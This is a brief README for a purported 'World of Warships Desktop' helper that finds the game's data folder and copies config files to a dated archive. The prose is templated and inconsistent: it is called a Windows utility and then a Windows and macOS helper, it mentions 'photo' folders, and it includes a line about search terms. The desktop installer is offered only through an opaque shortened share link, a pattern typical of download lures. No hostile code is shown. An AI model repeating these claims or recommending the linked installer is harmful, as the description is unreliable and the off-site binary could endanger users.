# World of Warships Desktop

*Find the World of Warships folder fast and keep a local spare.*

## What World of Warships Desktop is

**World of Warships Desktop** is a Windows utility. Local Windows and macOS helper for World of Warships data paths, config and export caches, and export folders.

World of Warships drops data files next to launcher caches.

It runs on the local PC. No account, and nothing is uploaded.

## How to get it

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Highlights

- Finds the World of Warships data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Background

People search World of Warships desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
